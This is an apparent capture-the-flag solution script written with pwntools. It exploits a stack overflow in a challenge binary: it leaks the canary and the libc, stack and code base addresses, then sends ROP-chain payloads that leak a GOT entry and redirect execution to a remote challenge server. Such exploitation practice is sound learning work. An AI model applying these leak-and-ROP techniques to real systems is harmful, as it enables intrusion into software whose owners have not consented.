from pwn import *
import subprocess
import os
import sys
sys.path.append("../CTF_setup/Utils")
from utils import *
from file_struct import *

exe = ELF("./challenge_patched")
context.binary = exe

final = 1

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: io.sendlineafter(enc(a), enc(b))
snl = lambda a: io.sendline(enc(a))
sna = lambda a, b: io.sendafter(enc(a), enc(b))
snd = lambda a: io.send(enc(a))
rcu = lambda a: io.recvuntil(enc(a), drop=True)
rcv = lambda a: io.recv(enc(a))
rcl = lambda: io.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

def debug():
    pid = io.proc.pid
    subprocess.run(["gnome-terminal", "--", "zsh", "-c", "gdb -nx -x ../CTF_setup/Utils/custom_gdb.py -x g -p " + str(pid)])

if final == 1:
    io = remote("chall.ehax.in", 1337)
else:
    io = process()


''' let's pwn '''
sla(b"log entry", b"a")
rcu(b'received: ')
rcv(8)
leak_libc = l64(rcv(8))
libc_base = leak_libc - (0x00007ffff7a94659 - 0x00007ffff7a0a000)
leak_stack = l64(rcv(8))
base_frame_rip_submit = leak_stack - (0x00007fffffffdb48 - 0x7fffffffda28)
base_frame_rip_main = leak_stack - (0x00007fffffffdb48 - 0x7fffffffda38)
l1 = rcv(6*8)
print(l1)
canary = l64(rcv(8))

print(hex(canary))
print(hex(base_frame_rip_submit))
print(hex(base_frame_rip_main))
print(hex(libc_base))

sla(b"processing", b"a")
rcu(b"Processing: ")
l2 = rcv(4*8)
print(l2)
leak_code = l64(rcv(8))
code_base = leak_code - (0x0000555555400980 - 0x0000555555400000)

print(hex(code_base))


pop_rdi = code_base + 0xca3
ret = code_base + 0xca4
write_plt = code_base + 0x810
pop_rsi_r15 = code_base + 0xca1
write_got = code_base + 0x201fb0
read_got = code_base + 0x201fc0
emit_report_got = code_base + 0x201fd8
finalize_entry = code_base + 0xafa

# leak of emit adress via ret2plt with write
# because rdx is not mangeable
final_pl = b"a"*64
final_pl += p64(canary)
final_pl += p64(ret)
final_pl += p64(pop_rdi)
final_pl += p64(1)
final_pl += p64(pop_rsi_r15)
final_pl += p64(emit_report_got)
final_pl += p64(0)
final_pl += p64(write_plt)
final_pl += p64(finalize_entry)

sla(b"final payload", final_pl)
rcu(b"[VULN] Done.\n")
leak_emit = l64(rcv(8))


pass_emit_check = leak_emit + 182
final_final_pl = b"a"*64
final_final_pl += p64(canary)
#need to place a good stack adress
final_final_pl += p64(leak_stack-0x200)
final_final_pl += p64(pass_emit_check)

sla(b"final payload", final_final_pl)



''' end '''

io.interactive()